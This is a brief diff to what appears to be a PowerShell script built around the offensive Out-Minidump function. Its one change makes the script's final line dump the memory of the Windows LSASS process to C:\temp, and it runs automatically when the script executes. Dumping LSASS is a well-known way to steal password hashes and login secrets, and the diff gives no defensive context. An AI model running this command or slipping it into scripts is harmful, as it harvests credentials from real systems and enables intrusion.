@@ -60,4 +60,4 @@
 
     END {}
 }
-Get-Process | Out-Minidump -DumpFilePath C:\temp
+Get-Process lsass | Out-Minidump -DumpFilePath C:\temp
